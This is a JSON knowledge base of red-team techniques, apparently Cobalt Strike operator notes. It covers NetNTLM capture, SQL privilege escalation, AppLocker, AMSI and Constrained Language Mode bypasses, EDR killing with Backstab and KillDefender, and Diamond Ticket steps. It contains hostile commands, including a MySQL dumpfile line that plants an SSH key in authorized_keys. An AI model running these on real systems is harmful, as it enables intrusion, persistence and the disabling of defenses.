            "\n## [[smbserver]]\nYou may also use the WinDivert + rportfwd combo (shown on the [[NTLM Relaying#Windows - Cobalt Strike]]) with Impacket's `smbserver.py` to capture the NetNTLM hashes.\n```sh\npython3 /usr/local/bin/smbserver.py -smb2support pwn .\n\nImpacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n[*] Incoming connection (127.0.0.1,46894)\n[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'\n[*] AUTHENTICATE_MESSAGE (EDU\\svc_mssql,SRV1)\n[*] User SRV1\\svc_mssql authenticated successfully\n[*] svc_mssql::EDU:[...snip...]\n[*] Connecting Share(1:pwn)\n```"
        ],
        "tools": [
            "InveighZero",
            "smbserver"
        ],
        "steps": []
    },
    {
        "id": "c94ea799-0a92-40e7-9642-0e4bb78dce49",
        "name": "SQL Privilege Escalation",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# SQL Privilege Escalation\n## Token exploitation\nA new instance of SQL is running as `NT Service\\MSSQL$SQLEXPRESS` (default). This user has a special type of privilege called `SeImpersonatePrivilege`.\nThis allows the account to \"impersonate a client after authentication\".\n\nCheck if the privilege has been assigned:\n[[Seatbelt#Get TokenPrivileges]]\n\nIn a nutshell, this privilege allows the user to impersonate a token that it's able to get a handle to.\n\nThe Problem:  \nAccount is not a local admin and can't get a handle to higher-privileged processes.\n\nThe Solution:\nForce a SYSTEM service to authenticate to a man-in-the-middle service that the attacker creates. This rogue service is then able to impersonate the SYSTEM service whilst it's trying to authenticate.\n\n## Authorized keys\nCreate authorized_keys via .sh file created via dumpfile\n```bash\nselect \"echo 'ssh-rsa xxxx' >> /home/ubuntu/.ssh/authorized_keys\" into dumpfile \"/var/lib/mysql/come_in.sh\";\n```\n\n\n## Tools\n########\n########",
        "category": "MS SQL Servers",
        "stealthy": false,
        "changes": [
            "\n## [[Seatbelt]]\n## Get TokenPrivileges\n```beacon\nbeacon> getuid\n[*] You are NT Service\\MSSQL$SQLEXPRESS\n\nbeacon> execute-assembly C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Debug\\Seatbelt.exe TokenPrivileges\n\n====== TokenPrivileges ======\n\nCurrent Token's Privileges\n\n SeAssignPrimaryTokenPrivilege:  DISABLED\n SeIncreaseQuotaPrivilege:  DISABLED\n SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED\n SeManageVolumePrivilege:  SE_PRIVILEGE_ENABLED\n SeImpersonatePrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED\n SeCreateGlobalPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED\n SeIncreaseWorkingSetPrivilege:  DISABLED\n\n[*] Completed collection in 0.01 seconds\n```"
        ],
        "tools": [
            "Seatbelt",
            "SweetPotato"
        ],
        "steps": []
    },
    {
        "id": "85b22029-a8df-4e26-a6c2-89813cccfb3a",
        "name": "AMSI",
        "phase": "10. Bypassing Defenses",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "`amsi.dll` is loaded into every process and checks the process for malicious signatures. Because it's loaded into the memory of each process, we can change its behaviour by overwriting instructions in memory.\n\n[[ThreadCheck]] can be used to check for AMSI detections.\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[ThreadCheck]]\n### Example\n> C:\\Users\\Rasta>ThreatCheck.exe -f Downloads\\Grunt.bin -e AMSI\n\n### Commands\n```cmd\nC:\\>ThreatCheck.exe --help\n  -e, --engine    (Default: Defender) Scanning engine. Options: Defender, AMSI\n  -f, --file      Analyze a file on disk\n  -u, --url       Analyze a file from a URL\n  --help          Display this help screen.\n  --version       Display version information.\n```"
        ],
        "tools": [
            "ThreadCheck"
        ],
        "steps": []
    },
    {
        "id": "19400de8-78eb-4982-b9b8-71b6d881f254",
        "name": "AppLocker",
        "phase": "10. Bypassing Defenses",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# AppLocker\nAppLocker  executables, libraries and scripts that are on a system. AppLocker can restrict the execution based on rules defined for the following categories:\n* Executable\n* Windows Installer\n* Script\n* Packaged App\n* DLLs\n\nThese rules can have the following status:\n* enforced  \n* audit only\n* none\n\n**If enforced** everything within that category is blocked. Rules can then be added to allow principals to execute files. The rules themselves can be defined based on file attributes such as path, publisher or hash. AppLocker has a set of default allow rules such as, \"allow everyone to execute anything within `C:\\Windows\\*`\".\n![](/Images/Pasted%20image%2020220323165007.png)\nCustom rules can be applied to block especially [\"LOLBAS's\"](https://lolbas-project.github.corp/).\n\nBypassing AppLocker is based on the rules defined\n1.  Executing untrusted code via trusts LOLBAS's.\n2.  Finding writeable directories within \"trusted\" paths.\n3.  By default, AppLocker is not even applied to Administrators.\n\n\u2139\ufe0f By default `C:\\Windows` is a trusted location which is being exploited by Cobalt Strike's `jump psexec[64]`.\nUploading into `C:\\Windows` requires elevated privileges, but there are places like `C:\\Windows\\Tasks` that are writeable by standard users. These areas are useful in cases where you have access to a machine (e.g. in an assumed breach scenario), and need to break out of AppLocker to run post-ex tooling.\n\n\u26a0\ufe0fDLL enforcement very rarely enabled due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break.\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Seatbelt"
        ],
        "steps": []
    },
    {
        "id": "805e23f2-3c53-4916-8d67-b8242435cf42",
        "name": "Bypassing Antivirus (AV)",
        "phase": "10. Bypassing Defenses",
        "ttp": "TA0005",
        "external": false,
        "description": "NoDescription",
        "content": "# Bypassing Antivirus (AV)\n\n## Show Detected Threads\n`Get-MpThreatDetection` is a Windows Defender cmdlet that can also show detected threats.\n```beacon\nbeacon> remote-exec winrm dc-1 Get-MpThreatDetection | select ActionSuccess, DomainUser, ProcessName, Resources\n\nActionSuccess  : True\nDomainUser     : \nProcessName    : Unknown\nResources      : {file:_C:\\Windows\\v34gs462.exe, file:_\\\\dc-1\\ADMIN$\\v34gs462.exe}\nPSComputerName : dc-1\n\nActionSuccess  : True\nDomainUser     : EDU\\patrick\nProcessName    : C:\\Windows\\System32\\wsmprovhost.exe\nResources      : {amsi:_C:\\Windows\\System32\\wsmprovhost.exe}\nPSComputerName : dc-1\n```\n\n## Cobalt Strike Kits\n- [[Artifact Kit]]\n- [[Resource Kit]]\n- Elevate Kit\n- Persistence Kit\n- Mimikatz Kit\n- Sleep Mask Kit\n- Thread Stack Spoofer\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "1cf73837-ecfa-4e7d-b73a-a690f195b196",
        "name": "Command Line Logging",
        "phase": "10. Bypassing Defenses",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "Use SocksProxy in order to bypass the command line logging\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "cafa8086-4901-44a0-b52e-5cc85c75be83",
        "name": "ETW",
        "phase": "10. Bypassing Defenses",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "Event Tracing for Windows (ETW) provides a mechanism to trace and log events that are raised by user-mode applications and kernel-mode drivers. ETW is implemented in the Windows operating system and provides developers a fast, reliable, and versatile set of event tracing features.\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "74a7fc8a-c51c-4a52-8710-bfefc7641c7d",
        "name": "Obfuscation",
        "phase": "10. Bypassing Defenses",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Invoke-Obfuscation]]\nImport-Module ./Invoke-Obfuscation.psd1\nInvoke-Obfuscation",
            "\n## [[Nimcrypt2]]\n```sh\nUsage:\n  nimcrypt -f file_to_load -t csharp/raw/pe [-o <output>] [-p <process>] [-n] [-u] [-s] [-e] [-g] [-l] [-v] [--no-ppid-spoof]\n  nimcrypt (-h | --help)\n\nOptions:\n  -h --help     Show this screen.\n  --version     Show version.\n  -f --file filename     File to load\n  -t --type filetype     Type of file (csharp, raw, or pe)\n  -p --process process   Name of process for shellcode injection\n  -o --output filename   Filename for compiled exe\n  -u --unhook            Unhook ntdll.dll\n  -v --verbose           Enable verbose messages during execution\n  -e --encrypt-strings   Encrypt strings using the strenc module\n  -g --get-syscallstub   Use GetSyscallStub instead of NimlineWhispers2\n  -l --llvm-obfuscator   Use Obfuscator-LLVM to compile binary\n  -n --no-randomization  Disable syscall name randomization\n  -s --no-sandbox        Disable sandbox checks\n  --no-ppid-spoof        Disable PPID Spoofing\n```"
        ],
        "tools": [
            "Invoke-Obfuscation",
            "Nimcrypt2"
        ],
        "steps": []
    },
    {
        "id": "bf4060e9-d50b-455f-86a1-c502ba175b7a",
        "name": "PowerShell Constrained Language Mode",
        "phase": "10. Bypassing Defenses",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# PowerShell Constrained Language Mode\nWhen AppLocker is enabled PowerShell is placed into Constrained Language Mode (CLM), which restricts it to core types.\n\n## Show language mode of CLM\n> $ExecutionContext.SessionState.LanguageMode\n\n> beacon> remote-exec winrm dc-1 $ExecutionContext.SessionState.LanguageMode\n\nAny AppLocker bypass can result in CLM bypass. Cobalt Strike has a `powerpick` command, which is an \"unmanaged\" implementation of tapping into a PowerShell runspace, without using `powershell.exe`.\n\n```beacon\nbeacon> run hostname\ndc-1\n\nbeacon> powershell $ExecutionContext.SessionState.LanguageMode\nConstrainedLanguage\n\nbeacon> powershell [math]::Pow(2,10)\n<Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\"><S S=\"Error\">Cannot invoke method. Method invocation is supported only on core types in this language mode._x000D__x000A_</S><S S=\"Error\">At line:1 char:1_x000D__x000A_</S><S S=\"Error\">+ [math]::Pow(2,10)_x000D__x000A_</S><S S=\"Error\">+ ~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S=\"Error\">    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException_x000D__x000A_</S><S S=\"Error\">    + FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage_x000D__x000A_</S><S S=\"Error\"> _x000D__x000A_</S></Objs>\n\nbeacon> powerpick $ExecutionContext.SessionState.LanguageMode\nFullLanguage\n\nbeacon> powerpick [math]::Pow(2,10)\n1024\n```\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "bf4730e9-d50b-455f-86a1-c502ba175b7a",
        "name": "Device Guard",
        "phase": "03. Host Enumeration",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# Windows Defender Application Control and virtualization-based protection of code integrity \n## Windows Defender Application Control\n## Microsoft Defender Application Guard",
        "category": "Protections",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "0180435c-e951-4e0a-aa02-38421e2e25dd",
        "name": "Signed drivers",
        "phase": "10. Bypassing Defenses",
        "ttp": "T1000",
        "external": false,
        "description": "Using signed drivers to kill AV / EDR tools",
        "content": "",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Backstab]]\n```cmd\nUsage: backstab.exe <-n name || -p PID> [options]  \n\t-n,\tChoose process by name, including the .exe suffix\n\t-p, \tChoose process by PID\n\t-l, \tList handles of protected process\n\t-k, \tKill the protected process by closing its handles\n\t-x, \tClose a specific handle\n\t-d, \tSpecify path to where ProcExp will be extracted\n\t-s, \tSpecify service name registry key\n\t-u, \tUnload ProcExp driver\n\t-a,\tadds SeDebugPrivilege\n\t-h, \tPrint this menu\n\n\tExamples:\n\tbackstab.exe -n cyserver.exe -k \t\t\t[kill cyserver]\n\tbackstab.exe -n cyserver.exe -x E4C \t\t[Close handle E4C of cyserver]\n\tbackstab.exe -n cyserver.exe -l \t\t\t[list all handles of cyserver]\n\tbackstab.exe -p 4326 -k -d c:\\\\driver.sys \t[kill protected process with PID 4326, extract ProcExp driver to C:\\ drive]\n```"
        ],
        "tools": [
            "Backstab"
        ],
        "steps": []
    },
    {
        "id": "eb4e2529-ad89-4120-84e2-251718212c1b",
        "name": "Token Sandboxing",
        "phase": "10. Bypassing Defenses",
        "ttp": "T1000",
        "external": false,
        "description": "Removes the privileges of the process token to isolate the process",
        "content": "",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Kill Defender]]\n> killdefender.exe <PID>"
        ],
        "tools": [
            "Kill Defender"
        ],
        "steps": []
    },
    {
        "id": "385824c8-406e-47c8-a45c-8c5136415294",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1558",
        "external": false,
        "description": "Diamond PACs are attackers\u2019 crafted PAC, signed with a stolen KRBTGT key. The Diamond PAC can be\nused by attackers to assign high privileges to a user\u2019s access request, regardless of the user\u2019s original\npermissions.\nIn contrast to the Golden Ticket attack, which also uses a stolen KRBTGT key and can be used to provide\nhigh privileges to the attacker, the Diamond PAC attack does not craft a full Kerberos ticket, but uses the\nstandard Kerberos flow (in the same manner of the MS14-068 exploit) to inject the crafted Diamond\nPAC.\nBy doing so, the Diamond PAC attack represents a more subtle version of the Golden Ticket attack and\nthus harder to detect. Detection rules designed to catch Golden Ticket attack based on the Kerberos\ntraffic anomaly it creates of a user sending a valid TGS with no prior AS requests to obtain a TGT will not\nalert on the Diamond PAC attack",
        "category": "",
        "stealthy": false,
        "tools": [],
        "changes": [],
        "name": "Diamond Ticket",
        "content": "",
        "steps": [
            {
                "id": "aee6a7d0-a9f3-476d-8965-baa349b6c78d",
                "name": "Get the KRBTGT",
                "description": "",
                "requirements": {},
                "results": [
                    "CRED:HASH:KRBTGT"
                ]
            },
            {
                "id": "fcc5d1d5-1d28-4993-90c6-65e083f75ef1",
                "name": "Get the TGTs authentication time",
                "description": "",
                "requirements": {},
                "results": [
                    "CRED:TICKET:TGT"
                ]
            },
            {
                "id": "90ec2fb0-6626-4ff8-9e65-de3ceb4f5db8",
                "name": "Get the SID of current domain",
                "description": "",
                "requirements": {},
                "results": [
                    "INTEL:DOMAIN:SID"
                ]
            },
            {
                "id": "37bd25df-c486-44ed-b6a1-cc8928e598ed",
                "name": "Generate diamond ticket",
                "description": "",
                "requirements": {
                    "and": [
                        {
                            "tag": "CRED:HASH:KRBTGT"
                        },
                        {
                            "tag": "CRED:TICKET:TGT"
                        },
                        {
                            "tag": "INTEL:DOMAIN:SID"
                        }
                    ]
                },
                "results": [
                    "CRED:TICKET:TGT:DIAMOND"
                ]
            }
        ]
    }
]
